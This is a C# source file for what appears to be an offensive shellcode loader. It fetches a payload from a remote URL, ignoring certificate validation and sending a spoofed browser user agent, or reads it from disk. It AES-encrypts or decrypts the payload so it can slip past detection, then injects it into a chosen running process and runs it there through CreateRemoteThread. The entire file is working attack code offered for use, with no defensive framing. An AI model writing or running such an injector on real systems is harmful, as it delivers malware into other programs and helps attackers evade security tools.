using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.IO;
using System.Security.Cryptography;

namespace Rem_proc_inj
{
    public class Win32
    {
        // Remote process thread shellcode injection function definitions
        [DllImport("kernel32")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);

        [DllImport("kernel32")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);

        // Process security access rights
        public static int PROCESS_CREATE_THREAD = 0x0002;
        public static int PROCESS_QUERY_INFORMATION = 0x0400;
        public static int PROCESS_VM_OPERATION = 0x0008;
        public static int PROCESS_VM_WRITE = 0x0020;
        public static int PROCESS_VM_READ = 0x0010;

        // Variables
        public static UInt32 MEM_COMMIT = 0x1000;
        public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        public static UInt32 PAGE_EXECUTE_READ = 0x20;
        public static UInt32 PAGE_READWRITE = 0x04;
        public static int SW_HIDE = 0;
    }

    public class rp_sc_ex
    {
        public static int GetPid(string procName)
        {
            int remoteProcId = 0;
            Process[] procs = Process.GetProcesses();
            foreach (Process proc in procs)
            {
                if (proc.ProcessName == procName)
                {
                    remoteProcId = proc.Id;
                    break;
                }
            }
            return remoteProcId;
        }

        public static void inj_sc(byte[] sc, int rProcId)
        {
            IntPtr hProcess = Win32.OpenProcess(Win32.PROCESS_CREATE_THREAD | Win32.PROCESS_QUERY_INFORMATION | Win32.PROCESS_VM_OPERATION | Win32.PROCESS_VM_WRITE | Win32.PROCESS_VM_READ, false, rProcId);
            IntPtr addr = Win32.VirtualAllocEx(hProcess, IntPtr.Zero, sc.Length, Win32.MEM_COMMIT, Win32.PAGE_READWRITE);
            Win32.WriteProcessMemory(hProcess, addr, sc, new IntPtr(sc.Length), 0);
            int oldProtect;
            Win32.VirtualProtectEx(hProcess, addr, (UIntPtr)sc.Length, Win32.PAGE_EXECUTE_READ, out oldProtect);
            Win32.CreateRemoteThread(hProcess, new IntPtr(0), new uint(), addr, new IntPtr(0), new uint(), new IntPtr(0));
        }

    }

    public class crypto
    {
        public static byte[] AES_encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    AES.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }
            return encryptedBytes;
        }

        public static byte[] AES_decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    AES.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }
            return decryptedBytes;
        }
    }

    class execute_program
    {
        public static byte[] downloader(string sc_url)
        {
            WebClient wc = new WebClient();
            wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKite/537.36 (KHTML, like Gecko) Chrome/89.0.3945.130 Safari/537.36");
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;

            // Ignore certificate issues
            ServicePointManager.ServerCertificateValidationCallback = delegate
            {
                return true;
            };

            byte[] sc_1 = wc.DownloadData(sc_url);
            return sc_1;

        }

        public static void PrintSC(byte[] scBytes)
        {
            StringBuilder sc = new StringBuilder();
            sc.Append("byte[] sc = new byte[");
            sc.Append(scBytes.Length);
            sc.Append("] { ");
            for (int i = 0; i < scBytes.Length; i++)
            {
                sc.Append("0x");
                sc.AppendFormat("{0:x2}", scBytes[i]);
                if (i < scBytes.Length - 1)
                {
                    sc.Append(",");
                }
            }
            sc.Append(" };");
            Console.WriteLine(sc.ToString());
        }

        public static void ex_prog(string password, bool Encrypt, bool Decrypt, string url = "", string localBinPath = "", string outFile = "", string rP = "")
        {
            if (Encrypt && Decrypt == false)
            {
                byte[] sc, encSc, passwd;
                if (url != "" && localBinPath == "")
                {
                    outFile = outFile + "_enc";
                    sc = execute_program.downloader(url);
                    passwd = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(password));
                    encSc = crypto.AES_encrypt(sc, passwd);
                    File.WriteAllBytes(outFile, encSc);
                    execute_program.PrintSC(encSc);
                }
                else if (url == "" && localBinPath != "")
                {
                    outFile = outFile + "_enc";
                    sc = File.ReadAllBytes(localBinPath);
                    passwd = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(password));
                    encSc = crypto.AES_encrypt(sc, passwd);
                    File.WriteAllBytes(outFile, encSc);
                    execute_program.PrintSC(encSc);
                }
            }
            else if (Encrypt == false && Decrypt)
            {
                byte[] encSc, decSc, passwd;
                int procId;
                if (url != "" && localBinPath == "")
                {
                    encSc = execute_program.downloader(url);
                    passwd = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(password));
                    decSc = crypto.AES_decrypt(encSc, passwd);
                    procId = rp_sc_ex.GetPid(rP);
                    Console.WriteLine("[>] Injecting & Executing SC {0}", rP);
                    rp_sc_ex.inj_sc(decSc, procId);
                }
                else if (url == "" && localBinPath != "")
                {
                    encSc = File.ReadAllBytes(localBinPath);
                    passwd = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(password));
                    decSc = crypto.AES_decrypt(encSc, passwd);
                    procId = rp_sc_ex.GetPid(rP);
                    Console.WriteLine("[>] Injecting & Executing SC into {0}", rP);
                    rp_sc_ex.inj_sc(decSc, procId);
                }
            }
            }
        }
    }
